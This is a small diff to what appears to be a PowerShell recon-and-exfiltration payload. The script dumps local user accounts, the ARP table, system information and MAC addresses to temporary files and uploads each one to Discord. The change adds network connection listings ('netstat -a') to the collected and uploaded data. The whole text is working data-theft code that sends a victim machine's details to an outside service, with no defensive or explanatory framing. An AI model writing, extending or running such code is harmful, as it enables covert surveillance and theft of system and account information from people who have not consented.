@@ -28,6 +28,7 @@ net user | Out-File -FilePath $env:TMP\users.txt
 arp -a | Out-File -FilePath $env:TMP\arp.txt
 systeminfo | Out-File -FilePath $env:TMP\systeminfo.txt
 getmac /v | Out-File -FilePath $env:TMP\mac.txt
+netstat -a | Out-File -FilePath $env:TMP\netstat.txt
 
 
 
@@ -59,6 +60,7 @@ Upload-Discord -file $env:TMP\users.txt
 Upload-Discord -file $env:TMP\arp.txt
 Upload-Discord -file $env:TMP\systeminfo.txt
 Upload-Discord -file $env:TMP\mac.txt
+Upload-Discord -file $env:TMP\netstat.txt
 
 
 
